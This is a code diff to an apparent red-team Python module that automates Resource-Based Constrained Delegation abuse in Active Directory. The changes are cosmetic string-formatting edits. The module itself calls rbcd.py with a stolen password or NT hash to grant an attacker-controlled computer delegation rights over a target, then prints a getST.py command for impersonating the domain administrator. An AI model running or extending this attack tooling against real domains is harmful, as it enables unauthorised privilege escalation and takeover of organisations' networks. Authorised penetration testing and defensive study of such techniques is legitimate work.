@@ -1,5 +1,4 @@
 """RBCD (Resource-Based Constrained Delegation) abuse via msDS-AllowedToActOnBehalfOfOtherIdentity."""
-from __future__ import annotations
 import subprocess
 import sys
 import shutil
@@ -32,8 +31,7 @@ def run(args: Any) -> int:
             print("[!] --attacker-computer required for write action", file=sys.stderr)
             return 1
 
-        print("[*] RBCD: delegating {} → {} on {}".format(
-            attacker_computer, target_computer, dc_ip))
+        print(f"[*] RBCD: delegating {attacker_computer} → {target_computer} on {dc_ip}")
 
         if shutil.which("rbcd.py"):
             cmd = [
@@ -42,32 +40,31 @@ def run(args: Any) -> int:
                 "-delegate-from", attacker_computer,
                 "-delegate-to", target_computer,
                 "-dc-ip", dc_ip,
-                "{}\\{}".format(args.domain, cred.username),
+                f"{args.domain}\\{cred.username}",
             ]
             if cred.has_hash:
-                cmd.extend(["-hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])
+                cmd.extend(["-hashes", f"{cred.lm_hash}:{cred.nt_hash}"])
             elif cred.password:
                 cmd.extend(["-p", cred.password])
 
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
             print(result.stdout)
             if result.returncode == 0:
-                print("\n[*] Next: getST.py -spn cifs/{} -impersonate administrator {}\\{}".format(
-                    target_computer, args.domain, attacker_computer))
+                print(f"\n[*] Next: getST.py -spn cifs/{target_computer} -impersonate administrator {args.domain}\\{attacker_computer}")
             return result.returncode
 
     elif action == "read":
-        print("[*] RBCD read: checking delegation on {}".format(target_computer))
+        print(f"[*] RBCD read: checking delegation on {target_computer}")
         if shutil.which("rbcd.py"):
             cmd = [
                 "rbcd.py", "-action", "read",
                 "-delegate-to", target_computer,
                 "-dc-ip", dc_ip,
-                "{}\\{}".format(args.domain, cred.username),
+                f"{args.domain}\\{cred.username}",
             ]
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
             print(result.stdout)
             return result.returncode
 
-    print("[!] rbcd.py not found — use bloodyAD or manual LDAP", file=sys.stderr)
+    print("[!] rbcd.py not found  -  use bloodyAD or manual LDAP", file=sys.stderr)
     return 1
